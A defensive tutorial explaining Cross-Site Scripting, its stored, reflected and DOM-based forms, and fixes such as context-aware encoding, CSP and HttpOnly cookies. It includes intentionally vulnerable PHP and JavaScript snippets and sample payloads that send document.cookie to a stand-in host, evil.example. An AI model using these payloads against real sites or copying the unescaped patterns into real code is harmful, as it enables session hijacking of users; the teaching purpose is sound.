---
title: "XSS Attack, Explained: How It Works and How to Prevent It"
category: Security
excerpt: >-
  A short, diagram-led note on Cross-Site Scripting. What XSS actually is,
  why unescaped output is the root cause, the three flavours of the attack
  with real payloads, and the small set of habits that shut it down for
  good. Readable in about 10–15 minutes.
---

{% raw %}
Cross-Site Scripting (XSS) is one of the oldest entries on the OWASP Top 10, and it is still everywhere — in comment boxes, search results, profile fields, even URL parameters reflected back onto a page. It survives because the mistake is easy to make and easy to miss in review: a piece of user data gets printed into HTML without being escaped.

This note is a compact tour. By the end you should be able to explain what XSS is, spot the pattern that causes it, tell the three attack types apart, and know exactly which techniques stop it.

---

## The one-sentence definition

**XSS happens when data supplied by a user is allowed to be interpreted as _HTML or JavaScript_ by the browser, instead of being treated purely as _text_ on the page.**

Everything else in this article is a consequence of that sentence.

---

## Why it happens: code and data get mixed in the browser too

This is the exact same root cause as SQL injection, just in a different parser:

- **Code** — HTML tags, attributes, and `<script>` content that the browser executes or renders.
- **Data** — a username, a comment, a search term, a URL parameter.

When a server (or client-side JS) writes user input straight into the page's HTML, the browser cannot tell which characters were meant to be a harmless string and which were meant to be markup. It just parses the whole response as HTML.

<figure>
<svg viewBox="0 0 680 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Diagram showing user input concatenated into an HTML template, which the browser parses as a mix of markup and data">
  <style>
    .lbl{font:600 13px -apple-system,Segoe UI,Roboto,sans-serif;fill:#0f172a;}
    .sub{font:12px -apple-system,Segoe UI,Roboto,sans-serif;fill:#64748b;}
    .mono{font:13px ui-monospace,SFMono-Regular,Menlo,monospace;}
    .box{fill:#f8fafc;stroke:#e2e8f0;stroke-width:1.5;rx:10;}
  </style>
  <rect class="box" x="1" y="30" width="200" height="70" rx="10"/>
  <text class="lbl" x="16" y="55">Developer's template</text>
  <text class="mono" x="16" y="78" fill="#2563eb">"&lt;p&gt;Hi, "</text>

  <rect class="box" x="1" y="150" width="200" height="70" rx="10"/>
  <text class="lbl" x="16" y="175">User input (comment)</text>
  <text class="mono" x="16" y="198" fill="#b91c1c">&lt;script&gt;...&lt;/script&gt;</text>

  <path d="M205 65 H255 M205 185 H255 M255 65 Q275 65 275 110 M255 185 Q275 185 275 130 M275 110 V125 H300" fill="none" stroke="#94a3b8" stroke-width="1.5"/>
  <polygon points="300,118 292,113 292,123" fill="#94a3b8"/>

  <rect class="box" x="305" y="80" width="230" height="90" rx="10"/>
  <text class="lbl" x="320" y="105">HTML sent to browser</text>
  <text class="mono" x="320" y="130" fill="#0f172a">&lt;p&gt;Hi,</text>
  <text class="mono" x="320" y="150" fill="#b91c1c">&lt;script&gt;...&lt;/script&gt;</text>

  <path d="M539 125 H575" fill="none" stroke="#94a3b8" stroke-width="1.5"/>
  <polygon points="578,125 570,120 570,130" fill="#94a3b8"/>

  <rect class="box" x="582" y="80" width="96" height="90" rx="10"/>
  <text class="lbl" x="596" y="120">Browser</text>
  <text class="sub" x="596" y="140">parses &amp;</text>
  <text class="sub" x="596" y="154">runs script</text>
</svg>
<figcaption style="font-size:1.25rem;color:#64748b;margin-top:8px;">The browser receives one blob of HTML. It cannot distinguish the developer's markup from the attacker's script tag — both get parsed and the script runs.</figcaption>
</figure>

---

## A concrete attack, step by step

Here is a comment box rendered the dangerous way. The language is PHP, but the flaw is identical in every language and framework that skips output escaping.

```php
// DANGEROUS — never do this
$comment = $_POST['comment'];

echo "<div class='comment'>" . $comment . "</div>";
```

### Step 1 — the normal case

Input: `Nice article, thanks!`

```html
<div class="comment">Nice article, thanks!</div>
```

Works fine. This is why the bug survives code review — the happy path looks correct.

### Step 2 — inject a script

Input: `<script>alert(document.cookie)</script>`

```html
<div class="comment"><script>alert(document.cookie)</script></div>
```

Every visitor who loads this page now runs the attacker's JavaScript, with full access to the page's DOM, cookies, and session.

### Step 3 — steal the session, not just show an alert

Input:

```html
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
```

The alert box was just a proof of concept. A real payload silently ships the victim's session cookie to an attacker-controlled server — no popup, no visible sign anything happened.

### Step 4 — skip the tag entirely, use an event handler

Filters that only block `<script>` are trivially bypassed:

```html
<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
```

There is no `<script>` tag at all. The broken image triggers `onerror`, which runs the same JavaScript. Dozens of attributes (`onload`, `onmouseover`, `onerror`, `onfocus`, `onclick`) can carry a payload.

<figure>
<svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Escalation ladder from a harmless alert box, to cookie theft, to session hijack, to full account takeover">
  <style>
    .t{font:600 13px -apple-system,Segoe UI,Roboto,sans-serif;fill:#0f172a;}
    .d{font:12px -apple-system,Segoe UI,Roboto,sans-serif;fill:#64748b;}
  </style>
  <rect x="1" y="150" width="150" height="46" rx="8" fill="#eff6ff" stroke="#bfdbfe"/>
  <text class="t" x="20" y="170">Prove it works</text>
  <text class="d" x="20" y="187">alert(1)</text>

  <rect x="171" y="110" width="150" height="46" rx="8" fill="#dbeafe" stroke="#93c5fd"/>
  <text class="t" x="190" y="130">Read cookies</text>
  <text class="d" x="190" y="147">document.cookie</text>

  <rect x="341" y="70" width="150" height="46" rx="8" fill="#fef3c7" stroke="#fcd34d"/>
  <text class="t" x="360" y="90">Exfiltrate</text>
  <text class="d" x="360" y="107">fetch() to attacker</text>

  <rect x="511" y="20" width="165" height="46" rx="8" fill="#fee2e2" stroke="#fca5a5"/>
  <text class="t" x="530" y="40">Session hijack</text>
  <text class="d" x="530" y="57">act as the victim</text>

  <path d="M151 165 L171 140 M321 128 L341 100 M491 88 L511 55" fill="none" stroke="#94a3b8" stroke-width="1.5"/>
  <polygon points="171,140 162,141 168,149" fill="#94a3b8"/>
  <polygon points="341,100 332,101 338,109" fill="#94a3b8"/>
  <polygon points="511,55 502,56 508,64" fill="#94a3b8"/>
</svg>
<figcaption style="font-size:1.25rem;color:#64748b;margin-top:8px;">One unescaped field is rarely "just" a popup. It is a foothold that escalates to full account takeover.</figcaption>
</figure>

---

## The three flavours of XSS

<figure>
<svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Three types of XSS: stored, reflected, and DOM-based, each with where the payload lives and how it reaches the victim">
  <style>
    .g{font:700 12.5px -apple-system,Segoe UI,Roboto,sans-serif;fill:#1d4ed8;}
    .k{font:600 12.5px -apple-system,Segoe UI,Roboto,sans-serif;fill:#0f172a;}
    .v{font:12px -apple-system,Segoe UI,Roboto,sans-serif;fill:#64748b;}
    .bx{fill:#f8fafc;stroke:#e2e8f0;stroke-width:1.5;}
  </style>
  <rect class="bx" x="1" y="10" width="678" height="82" rx="9"/>
  <text class="k" x="16" y="32">Stored (persistent)</text>
  <text class="v" x="16" y="53">Payload is saved in the database (a comment, profile bio, review) and served to</text>
  <text class="v" x="16" y="69">every visitor who views that page. Highest impact — no link needed, hits everyone.</text>

  <rect class="bx" x="1" y="104" width="678" height="82" rx="9"/>
  <text class="k" x="16" y="126">Reflected (non-persistent)</text>
  <text class="v" x="16" y="147">Payload rides in the request (a URL query param, a search box) and is echoed</text>
  <text class="v" x="16" y="163">straight back in the response. Needs the victim to click a crafted link.</text>

  <rect class="bx" x="1" y="198" width="678" height="82" rx="9"/>
  <text class="k" x="16" y="220">DOM-based</text>
  <text class="v" x="16" y="241">Never touches the server at all. Client-side JS reads something attacker-controlled</text>
  <text class="v" x="16" y="257">(location.hash, document.URL) and writes it into the DOM via innerHTML or similar.</text>
</svg>
<figcaption style="font-size:1.25rem;color:#64748b;margin-top:8px;">Same root cause, three different places the unescaped write happens: the database, the request/response cycle, or the browser's own JavaScript.</figcaption>
</figure>

**Reflected example** — a search page that echoes the query back:

```php
// DANGEROUS
echo "You searched for: " . $_GET['q'];
```

```
https://shop.example/search?q=<script>document.location='https://evil.example/steal?c='+document.cookie</script>
```

The attacker sends this link to the victim (email, chat, ad). One click runs the script in the victim's authenticated session.

**DOM-based example** — client-side code that trusts the URL:

```js
// DANGEROUS
document.getElementById('welcome').innerHTML =
  'Hello, ' + decodeURIComponent(location.hash.slice(1));
```

```
https://app.example/#<img src=x onerror=alert(document.cookie)>
```

Nothing is sent to the server. The bug is entirely in the browser, so server-side sanitisation cannot catch it — this one has to be fixed in the front-end code.

---

## The fix: escape output, by context

The cure is to **encode data for the context it lands in, right before it is written**, so the browser can never interpret it as anything other than a literal value.

<figure>
<svg viewBox="0 0 680 260" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Comparison: raw concatenation into HTML is unsafe; encoding the value for its output context is safe">
  <style>
    .h{font:700 13px -apple-system,Segoe UI,Roboto,sans-serif;}
    .m{font:12.5px ui-monospace,SFMono-Regular,Menlo,monospace;fill:#0f172a;}
    .n{font:12px -apple-system,Segoe UI,Roboto,sans-serif;fill:#64748b;}
  </style>

  <rect x="1" y="1" width="678" height="120" rx="10" fill="#fef2f2" stroke="#fecaca"/>
  <text class="h" x="20" y="26" fill="#b91c1c">✗  Raw concatenation</text>
  <text class="m" x="20" y="52">echo "&lt;div&gt;" . $comment . "&lt;/div&gt;"</text>
  <text class="m" x="20" y="74">Browser receives:  &lt;div&gt;&lt;script&gt;...&lt;/script&gt;&lt;/div&gt;</text>
  <text class="n" x="20" y="100">The value is written as-is. Any HTML inside it is parsed as markup.</text>

  <rect x="1" y="138" width="678" height="120" rx="10" fill="#f0fdf4" stroke="#bbf7d0"/>
  <text class="h" x="20" y="163" fill="#15803d">✓  Context-aware encoding</text>
  <text class="m" x="20" y="189">echo "&lt;div&gt;" . htmlspecialchars($comment) . "&lt;/div&gt;"</text>
  <text class="m" x="20" y="211">Browser receives:  &amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;  (shown as text)</text>
  <text class="n" x="20" y="237">Angle brackets become entities. The browser displays them, never executes them.</text>
</svg>
<figcaption style="font-size:1.25rem;color:#64748b;margin-top:8px;">Same user input, two outcomes. The only difference is whether the value was encoded for its context before being written.</figcaption>
</figure>

### How it looks in real code

**Raw PHP:**

```php
echo "<div class='comment'>" . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') . "</div>";
```

**Blade (Laravel)** — `{{ }}` escapes automatically:

```blade
<div class="comment">{{ $comment }}</div>
```

Only use `{!! !!}` when the value is trusted HTML you control, never raw user input.

**React** — JSX escapes by default; `dangerouslySetInnerHTML` is the escape hatch and needs sanitisation:

```jsx
<div className="comment">{comment}</div>   {/* safe — escaped automatically */}

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment) }} />  {/* only if you truly need raw HTML */}
```

**Vue** — `{{ }}` escapes; `v-html` is the equivalent escape hatch:

```html
<div class="comment">{{ comment }}</div>  <!-- safe -->
<div v-html="comment"></div>              <!-- dangerous unless sanitised -->
```

**Node.js / Express with a template engine (EJS):**

```ejs
<div class="comment"><%= comment %></div>   <!-- escaped -->
<div class="comment"><%- comment %></div>   <!-- NOT escaped — avoid with user input -->
```

Every modern templating engine escapes by default (`{{ }}`, `<%= %>`). The bug almost always comes from reaching for the engine's explicit "trust me, output raw HTML" syntax — `{!! !!}`, `v-html`, `dangerouslySetInnerHTML`, `<%- -%>` — on data that came from a user.

---

## Encoding is not one-size-fits-all

The same value needs *different* encoding depending on where it's written. This is the part people get wrong even when they know to "escape output."

<div markdown="1">

| Output context | Example | Encode with |
| --- | --- | --- |
| **HTML body** | `<div>{{ input }}</div>` | HTML entity encoding (`<` → `&lt;`) |
| **HTML attribute** | `<img alt="{{ input }}">` | Attribute encoding (also quote-aware) |
| **JavaScript string** | `<script>var x = "{{ input }}";</script>` | JS-string encoding — HTML encoding alone does *not* stop `";alert(1);//` |
| **URL parameter** | `<a href="?q={{ input }}">` | URL encoding (`encodeURIComponent`) |
| **CSS value** | `<div style="color:{{ input }}">` | CSS encoding, or avoid entirely |

</div>

Mixing these up is a common bypass: HTML-encoding a value that lands inside a `<script>` block does nothing, because the browser never treats that region as HTML in the first place — it's already inside a JS string. Use a library built for this (OWASP's ESAPI-style encoders, Laravel Blade, `DOMPurify` for cases needing rich HTML) rather than hand-rolling encoders per context.

---

## The trap: things that are *not* fixes

<div markdown="1">

| Non-fix | Why it fails |
| --- | --- |
| **Blocklisting `<script>`** | Bypassed by `<img onerror=...>`, `<svg onload=...>`, `<a href="javascript:...">`, and dozens of other event-handler and pseudo-protocol vectors. |
| **Stripping tags with regex** | HTML parsing is not a regular language; malformed or nested markup routinely slips through hand-written filters. |
| **Client-side validation only** | Anyone can bypass JS validation with browser devtools or a direct HTTP request. Validate again on the server. |
| **Escaping once, then reusing the "clean" string in a new context** | A value escaped for HTML is not automatically safe inside a `<script>` block or a URL — see the table above. |
| **`innerHTML = userInput`** | Directly parses the string as HTML. Use `textContent` for plain text, or a sanitiser if HTML is genuinely required. |
| **Trusting "internal" or "admin-only" fields** | Stored XSS in an admin panel still executes in the admin's browser — often a higher-value target than a public page. |

</div>

---

## Defense in depth

Output encoding stops the vulnerability at its source. The other layers limit the blast radius if something slips through — a new field added under deadline, a third-party widget, a forgotten `v-html`.

<figure>
<svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Four concentric layers of defense against XSS, from output encoding at the core outward to monitoring and cookie flags"><style>
    .ring{fill:none;stroke-width:34;}
    .rl{font:600 12.5px -apple-system,Segoe UI,Roboto,sans-serif;fill:#0f172a;}
    .rc{font:700 13px -apple-system,Segoe UI,Roboto,sans-serif;fill:#1d4ed8;}
  </style>
  <circle class="ring" cx="150" cy="150" r="40" stroke="#2563eb"/>
  <circle class="ring" cx="150" cy="150" r="74" stroke="#60a5fa"/>
  <circle class="ring" cx="150" cy="150" r="108" stroke="#93c5fd"/>
  <circle class="ring" cx="150" cy="150" r="142" stroke="#bfdbfe"/>

  <text class="rc" x="118" y="154">core</text>

  <line x1="292" y1="150" x2="330" y2="150" stroke="#cbd5e1"/>
  <text class="rl" x="336" y="118">1  Context-aware output encoding (templating engine default)</text>
  <text class="rl" x="336" y="146">2  Input validation — allow-list format for structured fields</text>
  <text class="rl" x="336" y="174">3  Content-Security-Policy header — blocks inline/unexpected scripts</text>
  <text class="rl" x="336" y="202">4  HttpOnly + Secure cookies, sanitiser (DOMPurify) for rich text</text>
</svg>
<figcaption style="font-size:1.25rem;color:#64748b;margin-top:8px;">Only layer 1 removes the bug. Layers 2–4 decide how bad it is when someone forgets layer 1 — a strong CSP in particular can stop a missed injection from ever running.</figcaption>
</figure>

**Content-Security-Policy is worth calling out specifically.** A header like:

```
Content-Security-Policy: script-src 'self'
```

tells the browser to refuse to execute inline `<script>` tags and event-handler attributes entirely, and only run scripts loaded from your own origin. It doesn't fix the injection, but it can turn a successful injection into a harmless, inert string — a strong second layer.

**Cookie flags matter too.** `HttpOnly` stops `document.cookie` from reading the session cookie at all, so even a successful XSS payload can't steal it directly. `Secure` and `SameSite=Strict/Lax` close related gaps.

---

## How it gets found

Testers and attackers probe the same way, and you can run these checks against your own app:

- **The angle bracket probe.** Enter `<script>alert(1)</script>` (or `"><svg onload=alert(1)>` for attribute contexts) into every field, URL parameter, and header your app reflects. If an alert box fires, the input reached the page unescaped.
- **Check every context, not just the obvious one.** Try the payload in query strings, form fields, `Referer`/`User-Agent` headers if you log and later render them, and file upload names.
- **Automated scanners.** Burp Suite, OWASP ZAP, and `dalfox` automate payload variations across contexts; static analysers (ESLint's `no-unsanitized`, Semgrep) flag `innerHTML`/`v-html`/`dangerouslySetInnerHTML` at build time. Wire one into CI.

Test on systems you own or are authorised to test. Unauthorised probing is illegal.

---

## A five-point checklist

1. **Never write user input into HTML, an attribute, a script, or a URL without encoding it for that specific context.**
2. **Trust your templating engine's default escaping** (`{{ }}`, `<%= %>`) and treat the raw-output escape hatch (`{!! !!}`, `v-html`, `dangerouslySetInnerHTML`) as a red flag requiring justification and sanitisation.
3. **Add a Content-Security-Policy header** that disallows inline scripts — it catches what encoding misses.
4. **Set `HttpOnly` and `Secure` on session cookies** so a successful injection still can't steal the session.
5. **Grep your codebase for the danger signs:** `innerHTML =`, `v-html`, `dangerouslySetInnerHTML`, `{!! !!}`, `<%- -%>`, `document.write(`. Review every hit.

---

## Conclusion

XSS is the browser-side twin of SQL injection: the same mistake — letting user data become code instead of staying data — just in a different parser. It shows up as stored, reflected, or DOM-based, but the fix is always the same shape: encode the value for the exact context it lands in, right before you write it, and let your templating engine do that by default instead of reaching for the raw-output escape hatch. Add a Content-Security-Policy and `HttpOnly` cookies as a safety net, and this entire class of vulnerability stops being something that reaches production.
{% endraw %}
